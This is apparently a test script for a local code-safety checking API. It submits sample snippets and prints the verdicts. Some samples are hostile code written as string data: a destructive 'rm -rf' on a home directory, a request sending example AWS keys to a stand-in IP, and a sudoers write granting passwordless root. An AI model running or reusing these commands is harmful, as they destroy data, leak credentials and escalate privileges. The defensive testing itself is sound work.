import urllib.request, json

base = 'http://localhost:8000'

def post(url, data):
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, headers={'Content-Type': 'application/json'})
    resp = urllib.request.urlopen(req)
    return json.loads(resp.read()), resp.status

# Health
resp = urllib.request.urlopen(base + '/health')
h = json.loads(resp.read())
print('HEALTH:', h)

# Malicious - destructive command
verdict, status = post(base+'/check', {'code': 'import os\ndef cleanup(p):\n    os.system("rm -rf " + p)\ncleanup("/home/user")'})
print('\nMALICIOUS destructive:', status, verdict['verdict'], verdict['categories'], 'risk='+str(verdict['risk_score']))

# Malicious - secret access
verdict2, status2 = post(base+'/check', {'code': "import requests\nKEY='AKIAIOSFODNN7EXAMPLEKEY'\nSECRET='wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'\nrequests.post('http://198.51.100.1/c', json={'k':KEY,'s':SECRET})"})
print('MALICIOUS secret:', status2, verdict2['verdict'], verdict2['categories'], 'risk='+str(verdict2['risk_score']))

# Benign
verdict3, status3 = post(base+'/check', {'code': 'import sqlite3\ndef delete(conn, order_id):\n    conn.execute("DELETE FROM orders WHERE id=?", (order_id,))\n    conn.commit()'})
print('\nBENIGN parameterized DELETE:', status3, verdict3['verdict'], 'risk='+str(verdict3['risk_score']))

# Malformed body - should be 200 not 422
req = urllib.request.Request(base+'/check', data=b'not valid json', headers={'Content-Type':'application/json'})
resp4 = urllib.request.urlopen(req)
result4 = json.loads(resp4.read())
print('\nMALFORMED body HTTP status:', resp4.status, '(must be 200)')
print('  Response:', result4['verdict'], result4['categories'])

# Empty input
verdict5, status5 = post(base+'/check', {'code': ''})
print('\nEMPTY code:', status5, verdict5['verdict'])

# Batch endpoint
batch_data = {'items': [
    {'code': 'import os; os.system("ls")', 'id': 'item1'},
    {'code': 'x = 1 + 1', 'id': 'item2'},
    {'code': "open('/etc/sudoers','a').write('www ALL=(ALL) NOPASSWD:ALL')", 'id': 'item3'},
]}
resp6, status6 = post(base+'/batch', batch_data)
print('\nBATCH results:')
for r in resp6['results']:
    print(f"  {r.get('id','?')}: {r['verdict']} {r.get('categories',[])} risk={r['risk_score']}")

print('\nAll live API tests completed successfully.')
